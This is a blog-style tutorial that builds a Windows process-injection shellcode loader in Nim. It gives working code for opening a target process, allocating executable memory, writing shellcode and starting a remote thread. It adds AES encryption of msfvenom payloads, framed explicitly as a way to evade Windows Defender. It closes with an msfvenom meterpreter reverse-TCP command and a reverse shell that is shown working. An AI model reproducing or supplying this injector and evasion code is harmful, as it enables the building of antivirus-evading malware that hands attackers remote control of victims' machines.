title: Using nim to do Process Injection

Nim is a lesser known language. That opens up a lot opportunities to explore and create malware.

1. Nimâ€™s language syntax is simple.
2. Nim can be cross compiled to produce payloads on both Windows, Linux and OSX.
3. Nim has great compatibility with the Windows API.

Let's start setup the development environment. My development environment is running on OSX. But this should work on any environment, just follow the [instructions](https://nim-lang.org/install.html).

Let's install Nim programming language and few libraries that can help us.

```bash
brew install mingw-w64 nim
nimble install winim zippy nimcrypto
```

Once you have installed the necessary packages and libraries. let use visual studio code to edit our nim project

There is a fantastic Nim language plugin, that can help us with creating our code.

<p align="center"><img src="/images/nim/vs_nim.jpeg"></p>

Once we have that ready, let's create our mandatory Hello World program

<p align="center"><img src="/images/nim/hello.jpeg"></p>

For this particular example,we used symbol **clang** to compile our code, so that it can run on mac.
But we want it to run on a windows machine, we have to change the symbol to **mingw**.

<p align="center"><img src="/images/nim/mingw.jpeg"></p>

Now the basics are out of the way, let's start talking about process injection.

There are 4 steps in process injection mechanism

1. Open the process we have permission to access and get a handle to it

2. Use VirtualAllocEx to allocate some memory space

3. Use WriteProcessMemory to write shellcode into the previously allocated memory

4. Use CreateRemoteThread to execute a thread with the shellcode in the process that we initial created a handle to.

Let's start with talking about getting a handle to a process.

To choose a process, it a straight forward thing. Some process that we have access to and is common on a windows machine. If it's running we can get a handle to it, or we can start a new instance of that project with **startProcess**

```nim
let tProcess = startProcess("notepad.exe")
```

Once we have the process id of the process, we can use OpenProcess to get a handle to that process.

```c++
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
);
```

If we look at the [MSDN](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) documentation, we need to specify the Desired Access, InheritHandle and ProcessId.

- A parameter for the desired access level to the process. We are requesting PROCESS_ALL_ACCESS.
- A true/false flag to inherit a handle or not. We can set this to false.
- A parameter to point it to the process ID of process we want the handle for.

```nim
let pHandle = OpenProcess(PROCESS_ALL_ACCESS,false,cast[DWORD](tProcess.processID))
```

Once we have the handle, we can allocate memory space where we can write our shellcode.
For this, we can use [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex).

```c++
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

- The process handle that we created.
- Pointer that specifies a starting address for the memory that we want to allocate. It's a optional field, so we can keep it NULL.
- The size of the memory needed. For this, we cast the length of our shellcode array as the value.
- The type of memory allocation, which we want to be MEM_COMMIT. It reserve the space for the memory and allocate the space in a single step.
- The memory protection for the region of pages to be allocated. For this example we are using RWX, but it's not OPSEC SAFE.

```nim
let mPointer = VirtualAllocEx(pHandle,NULL,cast[SIZE_T](shellcode.len),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
```

Once we have the memory allocated, let's write our shell code to the memory.

For this we can use [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)

```c++
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```

- The process handle that we created.
- A pointer to the base address in the specified process to which data is written.
- A pointer to the shellcode.
- The size of the memory needed. For this, we cast the length of our shellcode array as the value.
- A pointer to a variable that receives the number of bytes transferred into the specified process. This parameter is optional, so we can set it to NULL.

```nim
WriteProcessMemory(pHandle,mPointer,unsafeAddr shellcode,cast[SIZE_T](shellcode.len),NULL)
```

Once we have the shellcode written to the memory, we can use CreateRemoteThread to execute a thread with the shellcode

```c++
HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  [in]  SIZE_T                 dwStackSize,
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
  [in]  LPVOID                 lpParameter,
  [in]  DWORD                  dwCreationFlags,
  [out] LPDWORD                lpThreadId
);
```

- The process handle that we created.
- A pointer to a SECURITY_ATTRIBUTES structure that specifies a security descriptor for the new thread and determines whether child processes can inherit the returned handle. We can set it to NULL.
- The initial size of the stack, in bytes. We can set this parameter to 0, so the new thread uses the default size for the executable.
- A pointer to the application-defined function of type LPTHREAD_START_ROUTINE to be executed by the thread and represents the starting address of the thread in the remote process.
- A pointer to a variable to be passed to the thread function. We can set it to NULL.
- The flags that control the creation of the thread. We can set it to 0, so the thread runs immediately after creation.
- A pointer to a variable that receives the thread identifier. We can set this parameter to NULL, so the thread identifier is not returned.

```nim
CreateRemoteThread(pHandle,NULL,0,cast[LPTHREAD_START_ROUTINE](Point),NULL,0,NULL)
```

Once we have the routine to inject the shellcode, let's create shellcode with msfvenom

<p align="center"><img src="/images/nim/msg_msf.jpeg"></p>
Let's use the shellcode in our nim code.

```nim
var shellcode: array[311, byte] = [
    byte 0x48,0x31,0xc9,0x48,0x81,0xe9,0xde,0xff,0xff,<snip>]
```

Once everything in set, let's compile our program with some extra flags to try to reduce the size.

```bash
nim c -d:mingw --cpu:amd64 -d:danger -d:strip --opt:size pi.nim
```

Once we have our executable, let's check whether it's working or not.

<p align="center"><img src="/images/nim/pi_exe.jpeg"></p>

As we can see, we were able to pop a message box. But we have problem. Windows Defender.

<p align="center"><img src="/images/nim/pi_exe.jpeg"></p>

I was running from an excluded folder, otherwise it's getting flagged.

Let's change that. Since it's getting flagged as the meterpreter, we can assume that the shellcode in the code is the offending party. So let's encrypt that.

We can write a encryption code, that will output a encrypted version of our payload. We will use that and decrypt it in runtime.

So let's create a new program **enc.nim**

Let's import the libraries we want and define the payload we want to encrypt.

```nim
import os
import strformat
import base64
import nimcrypto


#msfvenom -a x64 -p windows/x64/messagebox -f csharp
var code: array[295, byte] = [
    byte 0xfc,0x48,0x81,0xe4,0xf0,<snip>]
```

Now let's create a routine that can encrypt our payload. I found a [project](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/nim/encrypt_shellcode.nim) by [S3cur3Th1sSh1t](https://twitter.com/ShitSecure). Am just reusing his work.

The program have the shellcode hardcoded and the password will be passed through command line.

```nim
var
    plaintext: array[295, byte] = code
    ectx: CTR[aes256]
    key: array[aes256.sizeKey, byte]
    encrypted: seq[byte] = newSeq[byte](len(plaintext))
var expandedKey = sha256.digest(paramStr(1))
copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))

echo fmt"[*] Encrypting shellcode using password: {paramStr(1)}"

# Change  IV
ectx.init(key, [byte 123, 231, 234, 243, 123, 231, 234, 243, 125, 249, 123, 231, 234, 243, 133, 149])

ectx.encrypt(plaintext, encrypted)
ectx.clear()

echo "[*] Writing encrypted base64 encoded shellcode :\n",encode(encrypted)
```

Once we have the code, let's compile and create our encrypted payload.

<p align="center"><img src="/images/nim/enc_shell.jpeg"></p>

We can use the put in our existing code. But we need to write decryption routine. So am once again using [S3cur3Th1sSh1t](https://twitter.com/ShitSecure)'s [work](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/nim/encrypted_shellcode_loader.nim)

Before adding the decryption routine, let's make some changes to the code.

We will create a new function called CRT and add our process injection code there.

```nim
proc CRT[byte](shellcode: openArray[byte]): void =
    <code>
```

We will define a default entry point by creating **isMainModule** and inside that we will write the decryption routine.

```nim
when isMainModule:

    func toByteSeq*(str: string): seq[byte] {.inline.} = @(str.toOpenArrayByte(0, str.high))
    # Add encrypted shellcode
    let code: string = "Qcpl4JUHjauAZ6C6wAlJmH0wdJxp7<snip>"
    var
        encrypted: seq[byte] = toByteSeq(decode(code))
        dctx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        decrypted: seq[byte] = newSeq[byte](len(encrypted))

    var expandedKey = sha256.digest(paramStr(1))
    copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))

    # Change  IV
    dctx.init(key, [byte 123, 231, 234, 243, 123, 231, 234, 243, 125, 249, 123, 231, 234, 243, 133, 149])
    dctx.decrypt(encrypted, decrypted)
    dctx.clear()
    CRT(decrypted)
```

Once the code flow is fixed. Let's compile and see whether it's working or not.

<p align="center"><img src="/images/nim/enc_shell.jpeg"></p>

As we can see that, there was no interference from from Windows Defender.

Let's push out luck and try to execute a meterpreter revershell.

We can create a meterpreter shellcode using.

```bash
#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.3.5 LPORT=4444 -f csharp
```

Once we have the payload,we can change the enc.nim file and recompile it.

<p align="center"><img src="/images/nim/enc_rev_shell.png"></p>

We we have the encrypted payload, put that the our shellcode runner and recompile it.

<p align="center"><img src="/images/nim/compile_pi_enc_rev.jpeg"></p>

Once we have the executable, it's time to setup a listener and hope for the best.

<p align="center"><img src="/images/nim/msf_rev_session_exe.jpeg"></p>

<p align="center"><img src="/images/nim/msf_rev_session.jpeg"></p>

As we can see from the above screenshots, we were able to successful inject into notepad and get a reverse connection back to our listener.
